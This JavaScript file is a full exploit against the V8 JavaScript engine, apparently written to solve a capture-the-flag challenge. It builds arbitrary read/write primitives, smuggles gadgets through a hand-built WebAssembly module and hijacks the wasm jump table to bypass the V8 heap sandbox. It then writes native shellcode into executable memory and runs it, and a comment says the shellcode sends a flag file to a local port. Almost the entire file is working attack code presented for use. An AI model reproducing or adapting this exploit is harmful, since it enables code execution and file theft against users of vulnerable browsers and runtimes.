var wasm_code = new Uint8Array([
    0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00, 0x01, 0x0E, 0x03, 0x60, 0x00, 0x01, 0x7E, 0x60,
    0x02, 0x7E, 0x7E, 0x01, 0x7E, 0x60, 0x00, 0x00, 0x03, 0x06, 0x05, 0x00, 0x01, 0x01, 0x00, 0x02,
    0x05, 0x03, 0x01, 0x00, 0x01, 0x07, 0x5D, 0x05, 0x10, 0x61, 0x72, 0x62, 0x5F, 0x77, 0x72, 0x69,
    0x74, 0x65, 0x5F, 0x67, 0x61, 0x64, 0x67, 0x65, 0x74, 0x00, 0x00, 0x14, 0x61, 0x72, 0x62, 0x5F,
    0x77, 0x72, 0x69, 0x74, 0x65, 0x36, 0x34, 0x5F, 0x6F, 0x6E, 0x65, 0x5F, 0x73, 0x68, 0x6F, 0x74,
    0x00, 0x01, 0x0B, 0x61, 0x72, 0x62, 0x5F, 0x77, 0x72, 0x69, 0x74, 0x65, 0x36, 0x34, 0x00, 0x02,
    0x10, 0x73, 0x68, 0x65, 0x6C, 0x6C, 0x63, 0x6F, 0x64, 0x65, 0x5F, 0x62, 0x75, 0x66, 0x66, 0x65,
    0x72, 0x00, 0x03, 0x0E, 0x65, 0x78, 0x65, 0x63, 0x5F, 0x73, 0x68, 0x65, 0x6C, 0x6C, 0x63, 0x6F,
    0x64, 0x65, 0x00, 0x04, 0x0A, 0x3D, 0x05, 0x0D, 0x00, 0x42, 0xC8, 0x92, 0xC2, 0x80, 0x89, 0x92,
    0xA4, 0xC8, 0x90, 0x7F, 0x0B, 0x0D, 0x00, 0x42, 0x90, 0xA1, 0xC2, 0x84, 0x89, 0x92, 0xA4, 0xC8,
    0x90, 0x7F, 0x0B, 0x0D, 0x00, 0x42, 0x90, 0xA1, 0xC2, 0x84, 0x89, 0x92, 0xA4, 0xC8, 0x90, 0x7F,
    0x0B, 0x0D, 0x00, 0x42, 0x90, 0xA1, 0xC2, 0x84, 0x89, 0x92, 0xA4, 0xC8, 0x90, 0x7F, 0x0B, 0x03,
    0x00, 0x01, 0x0B, 0x00, 0x76, 0x04, 0x6E, 0x61, 0x6D, 0x65, 0x01, 0x48, 0x04, 0x00, 0x10, 0x61,
    0x72, 0x62, 0x5F, 0x77, 0x72, 0x69, 0x74, 0x65, 0x5F, 0x67, 0x61, 0x64, 0x67, 0x65, 0x74, 0x01,
    0x14, 0x61, 0x72, 0x62, 0x5F, 0x77, 0x72, 0x69, 0x74, 0x65, 0x36, 0x34, 0x5F, 0x6F, 0x6E, 0x65,
    0x5F, 0x73, 0x68, 0x6F, 0x74, 0x02, 0x0B, 0x61, 0x72, 0x62, 0x5F, 0x77, 0x72, 0x69, 0x74, 0x65,
    0x36, 0x34, 0x03, 0x10, 0x73, 0x68, 0x65, 0x6C, 0x6C, 0x63, 0x6F, 0x64, 0x65, 0x5F, 0x62, 0x75,
    0x66, 0x66, 0x65, 0x72, 0x02, 0x25, 0x05, 0x00, 0x00, 0x01, 0x02, 0x00, 0x04, 0x61, 0x64, 0x64,
    0x72, 0x01, 0x05, 0x76, 0x61, 0x6C, 0x75, 0x65, 0x02, 0x02, 0x00, 0x04, 0x61, 0x64, 0x64, 0x72,
    0x01, 0x05, 0x76, 0x61, 0x6C, 0x75, 0x65, 0x03, 0x00, 0x04, 0x00
]);

var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var { exec_shellcode, shellcode_buffer, arb_write_gadget, arb_write64_one_shot, arb_write64 } = wasm_instance.exports;

// conversation arrays
var conversion_buffer = new ArrayBuffer(8);
var float_view = new Float64Array(conversion_buffer);
var int_view = new BigUint64Array(conversion_buffer);

var compressed_address_extractor = []
// oob read/write arrays it consists of floats, to be able to read/write pointers as floats
var oob_array = [1.1, 2.2, 3.3, 4.4]
// Array whose elements ptr we'll corrupt to achieve caged arb read/write
var rw_array = [1.1, 2.2, 3.3, 4.4]
// Just a test array to check if we can read/write what we need
var test_array = [13.37, 42.42, 13.37, 42.42]

// Convert BigInt to hex representation
BigInt.prototype.hex = function () {
    return '0x' + this.toString(16);
};

// Convert BigInt to float representation
BigInt.prototype.i2f = function () {
    int_view[0] = this;
    return float_view[0];
}

// Set the lowest bit to represent a tagged pointer
BigInt.prototype.tag = function () {
    return this | 1n;
};

// Unset the lowest bit to represent an untagged pointer
BigInt.prototype.unTag = function () {
    return this & ~(1n);
}

// get low dword
BigInt.prototype.low = function () {
    return this & BigInt(0xffffffffn);
};

// get high dword
BigInt.prototype.high = function () {
    return this >> BigInt(32);
}

// Convert a Number to hex representation
Number.prototype.hex = function () {
    return '0x' + this.toString(16);
};

// Convert a Number (float) to integer representation
Number.prototype.f2i = function () {
    float_view[0] = this;
    return int_view[0];
}

function sleepFor(sleepDuration) {
    var now = new Date().getTime();
    while (new Date().getTime() < now + sleepDuration) { /* do nothing */ }
}

// Get the offset of object inside v8's ubercage
function v8h_addrOf(obj) {
    compressed_address_extractor[0] = obj;
    return compressed_address_extractor.readAt(0).f2i().low();
}

function v8h_read64(offset) {
    // Read the old value and update only the offset part
    let updated = (oob_array.readAt(12).f2i() & 0xffffffff00000000n) | offset.tag();
    // Backing "caged pointer" of the rw_array
    oob_array.writeAt(12, updated.i2f());
    return rw_array[0].f2i();
}

function v8h_write64(offset, value) {
    // Read the old value and update only the offset part
    let updated = (oob_array.readAt(12).f2i() & 0xffffffff00000000n) | offset.tag();
    // Backing "caged pointer" of the rw_array
    oob_array.writeAt(12, updated.i2f());
    rw_array[0] = value.i2f();
}

function test_caged_read_works() {
    // %DebugPrint(test_array);
    test_array_offset = v8h_addrOf(test_array);
    test_array_elements_offset = v8h_read64(test_array_offset).low();
    if (v8h_read64(test_array_elements_offset).i2f() != 13.37) {
        console.log('[-] Caged read failed trying to read test_array[0] = 13.37');
        throw Error();
    }

    if (v8h_read64(test_array_elements_offset + 8n).i2f() != 42.42) {
        console.log('[-] Caged read failed trying to read test_array[1] = 42.42');
        throw Error();
    }

    return true;
    // %DebugPrint(test_array);
}

function test_caged_write_works() {
    // %DebugPrint(test_array);
    test_array_offset = v8h_addrOf(test_array);
    test_array_elements_offset = v8h_read64(test_array_offset).low();
    v8h_write64(test_array_elements_offset, 99.99.f2i());
    if (test_array[0] != 99.99) {
        console.log('[-] Caged write failed trying to write test_array[0] = 99.99');
        throw Error();
    }

    v8h_write64(test_array_elements_offset + 8n, 11.11.f2i());
    if (test_array[1] != 11.11) {
        console.log('[-] Caged write failed trying to write test_array[1] = 11.11');
        throw Error();
    }

    return true;
    // %DebugPrint(test_array);
}

function do_exploit() {
    // Make sure that the needed functions are compiled
    arb_write_gadget();
    arb_write64(0x41414141n, 0x42424242n);
    shellcode_buffer();

    rw_array_offset = v8h_addrOf(rw_array);
    oob_array_offset = v8h_addrOf(oob_array);

    console.log(`[+] rw_array offset: ${rw_array_offset.hex()}`);
    console.log(`[+] oob_array offset: ${oob_array_offset.hex()}`);

    if (oob_array_offset > rw_array_offset) {
        console.log('[-] oob_array is located after the rw_array');
        throw Error();
    }

    if (test_caged_read_works()) {
        console.log('[+] Caged read works!');
    }

    if (test_caged_write_works()) {
        console.log('[+] Caged write works!');
    }

    // % DebugPrint(wasm_instance);

    let wasm_instance_offset = v8h_addrOf(wasm_instance);

    // Offsets inside the wasm_instance object.
    const JUMP_TABLE_PTR_OFF = 0x40n;
    const TIERING_BUDGET_ARRAY_OFF = 0x70n;

    // Offsets inside the compiled wasm code.
    const ARB_WRITE64_ONE_SHOT_OFF = 0xb80n;
    const ARB_WRITE64_GADGET_OFF = ARB_WRITE64_ONE_SHOT_OFF + 0x1an;
    const ARB_WRITE64_OFF = 0xc00n;
    const ARB_WRITE64_INSTR_TO_OVERWRITE_OFF = ARB_WRITE64_OFF + 0x18n;
    const SHELLCODE_BUFFER_OFF = 0xc80n;

    let jumptable_ptr = v8h_read64(wasm_instance_offset + JUMP_TABLE_PTR_OFF);
    let original_sub_tiering_budget = v8h_read64(wasm_instance_offset + TIERING_BUDGET_ARRAY_OFF);

    // Address of the SHR instruction in the liftoff-compiled `arb_write64` that should limit the address size.
    let arb_write64_one_shot_addr = jumptable_ptr + ARB_WRITE64_ONE_SHOT_OFF;
    let arb_write64_gadget_addr = jumptable_ptr + ARB_WRITE64_GADGET_OFF;
    let arb_write64_addr = jumptable_ptr + ARB_WRITE64_OFF;
    let arb_write64_instr_to_overwrite_addr = jumptable_ptr + ARB_WRITE64_INSTR_TO_OVERWRITE_OFF;
    let shellcode_buffer_addr = jumptable_ptr + SHELLCODE_BUFFER_OFF;

    console.log(`[+] wasm_instance offset: ${wasm_instance_offset.hex()}`);
    console.log(`[+] jumptable_ptr: ${jumptable_ptr.hex()}`);
    console.log(`[+] original_sub_tiering_budget: ${original_sub_tiering_budget.hex()}`);
    console.log(`[+] arb_write64_one_shot_addr: ${arb_write64_one_shot_addr.hex()}`);
    console.log(`[+] arb_write64_gadget_addr: ${arb_write64_gadget_addr.hex()}`);
    console.log(`[+] arb_write64_addr: ${arb_write64_addr.hex()}`);
    console.log(`[+] arb_write64_instr_to_overwrite_addr: ${arb_write64_instr_to_overwrite_addr.hex()}`);
    console.log(`[+] shellcode_buffer_addr: ${shellcode_buffer_addr.hex()}`);

    // Jump to the "smuggled" gadget (mov QWORD PTR [rax], rdx;)
    v8h_write64(wasm_instance_offset + JUMP_TABLE_PTR_OFF, arb_write64_gadget_addr - 5n);
    arb_write64_one_shot(arb_write64_instr_to_overwrite_addr, 0x9090909090108948n);

    // shellcode to send /ubercaged/flag.txt to 127.0.0.1:1337
    let shellcode = [
        0x9090909090909090n,
        0x9090909090909090n,
        0x9090909090909090n,
        0x016a5f026a58296an,
        0x48c58948050f995en,
        0x01010101010101b8n,
        0x38040103b8485002n,
        0x240431480301017en,
        0x106aef8948582a6an,
        0x8949050fe689485an,
        0x34810175797568e8n,
        0x65b8480101010124n,
        0x502e67616c662f64n,
        0x63726562752fb848n,
        0x894858026a506761n,
        0xc38948050ff631e7n,
        0x894858056ac78948n,
        0x4830c48348050fe6n,
        0x286ad2894924148bn,
        0x99de8948c7894c58n,
        0x050fn,
    ]

    shellcode.forEach((value, index) => {
        arb_write64(shellcode_buffer_addr + BigInt(index * 8), value);
    });

    // Jump to the shellcode
    v8h_write64(wasm_instance_offset + JUMP_TABLE_PTR_OFF, shellcode_buffer_addr - 5n);
    exec_shellcode();
}

do_exploit();